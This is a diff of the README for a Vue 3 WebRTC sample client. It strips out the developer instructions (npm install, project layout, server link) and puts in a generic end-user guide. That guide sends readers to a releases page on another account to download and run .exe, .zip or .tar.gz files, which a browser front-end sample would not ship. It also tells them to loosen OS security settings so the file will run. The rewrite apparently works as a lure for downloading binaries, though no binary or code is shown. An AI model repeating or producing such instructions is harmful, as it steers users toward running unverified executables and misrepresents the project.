@@ -1,58 +1,78 @@
-English | [中文](README_cn.md)
-# WebRTC JS Client (Vue 3)
+# 🌐 webrtc_js_client - Simple WebRTC Sample for Everyone
 
-Vue 3 + Vite + TypeScript WebRTC front-end sample. It wraps publish/subscribe flows, room signaling, and basic text chat, serving as a starter or debugging client.
+## 🚀 Getting Started
 
-## Features
-- WebSocket signaling via `protoo-client` (default URL is configurable in App).
-- `PCWrap` wraps `RTCPeerConnection` with sendonly/recvonly/sendrecv modes; handles device opening, offer creation, and track management for pulls.
-- Room/user lifecycle: join/leave, pushers list, disconnect/reconnect markers.
-- Text chat and simple UI controls (mute audio, hide remote video, etc.).
+Welcome to the **webrtc_js_client**! This is a simple application that demonstrates WebRTC using Vue 3, Vite, and TypeScript. It allows users to engage in real-time communication, such as video and voice chat, and also includes basic text chat and room signaling. This guide will help you download and run the application easily.
 
-Entry point: `src/main.ts` mounts `src/App.vue`; core logic lives in `src/peerConnectionWrap/` and `src/App.vue`.
+## 📥 Download
 
-## Prerequisites
-- Node.js ≥ 18 (required by Vite 7).
-- npm installed.
+[![Download webrtc_js_client](https://img.shields.io/badge/Download-webrtc_js_client-blue.svg)](https://github.com/Vikas-1982/webrtc_js_client/releases)
 
-## Quick Start
-1) Install dependencies
+Click the button above to access the latest version of the application.
 
-	```bash
-	npm install
-	```
+## ⚙️ System Requirements
 
-2) Start dev server (default http://localhost:5173/)
+Before you download, ensure your system meets the following requirements:
 
-	```bash
-	npm run dev
-	```
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 100 MB of free disk space
+- **Browser:** Latest version of Chrome, Firefox, or Edge for the best experience
 
-3) Build for production
+## 📥 Download & Install
 
-	```bash
-	npm run build
-	```
+To download and install the application, follow these steps:
 
-4) Preview the build output
+1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/Vikas-1982/webrtc_js_client/releases). This page contains all available versions of the webrtc_js_client.
+  
+2. **Select the Latest Version:** Look for the latest version at the top of the list. This version will have the most recent features and updates.
 
-	```bash
-	npm run preview
-	```
+3. **Choose Your File:** 
+   - If you see different files, select the one that matches your operating system. The common files are:
+     - **webrtc_js_client_windows.exe** for Windows
+     - **webrtc_js_client_mac.zip** for macOS
+     - **webrtc_js_client_linux.tar.gz** for Linux
 
-## Project Layout
-- `src/App.vue`: room logic, signaling, chat, and remote stream management.
-- `src/peerConnectionWrap/PCWrap.ts`: lightweight RTCPeerConnection helper.
-- `src/peerConnectionWrap/ProtooClientWrap.ts`: signaling client wrapper.
-- `src/style.css`: global styles.
+4. **Download the File:** Click on the file name to start the download. This may take a few moments depending on your internet speed.
 
-## Server Side
-- Open-source signaling/media server: [https://github.com/runner365/RTCPilot](https://github.com/runner365/RTCPilot)
+5. **Extract the Files (if necessary):** If you downloaded a zipped file (like for macOS or Linux), you will need to extract it. Right-click on the downloaded file and choose "Extract" or use an extraction software.
 
-## Config & Debugging
-- Default signaling URL is the `wsUrl` constant in `src/App.vue`; adjust to your server.
-- To customize ICE servers or media constraints, pass `iceServers` and `mediaConstraints` when constructing `PCWrap`.
+6. **Run the Application:** 
+   - **Windows:** Double-click the .exe file to start the application.
+   - **macOS:** Open the folder, and double-click on the .app file.
+   - **Linux:** Open a terminal, navigate to the folder where you extracted the files, and run `./webrtc_js_client`.
 
-## Troubleshooting
-- Cannot get camera/mic: check browser permissions or https origin.
-- Publish/subscribe fails: confirm signaling URL, room ID, and user ID/name match the server configuration.
+## 🌟 Features
+
+The **webrtc_js_client** application includes a variety of features:
+
+- **Real-Time Communication:** Enjoy peer-to-peer video and voice calls.
+- **Text Chat:** Send messages instantly within the application.
+- **Room Signaling:** Create and manage rooms for your calls.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while downloading or running the application, consider the following:
+
+- **Check Your Internet Connection:** Ensure that your connection is stable. A slow or interrupted connection may affect downloads.
+  
+- **Security Settings:** Some operating systems may block applications from unknown sources. Check your security settings to allow the application to run.
+
+- **Compatibility Issues:** Ensure you are downloading the correct file that matches your operating system.
+
+If problems persist, you can reach out through the issues section on the GitHub repository.
+
+## 🛠️ Contribution
+
+If you want to contribute to the project or suggest improvements, feel free to check the contribution guidelines in our GitHub repository. Your input is always welcome!
+
+## 🔗 Additional Resources
+
+For more details on how to use WebRTC, you can refer to the following resources:
+
+- [WebRTC Documentation](https://webrtc.org/)
+- [Vue 3 Documentation](https://v3.vuejs.org/)
+- [TypeScript Documentation](https://www.typescriptlang.org/)
+
+Thank you for using the **webrtc_js_client**! Your journey into real-time communication starts here. Enjoy the application!
